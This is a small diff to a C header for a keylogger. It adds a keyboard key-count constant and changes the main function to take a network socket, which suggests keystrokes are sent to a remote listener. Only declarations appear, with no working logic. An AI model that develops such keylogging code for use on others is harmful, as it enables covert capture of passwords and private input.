@@ -4,8 +4,9 @@
 
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
+#define FULL_KEYBOARD_KEY_NUMBER 104
 
-int keylogger_main();
+void keylogger_main(SOCKET socket);
 void keylogger(SOCKET sock);
 void change_active();
 void change_active(int change);
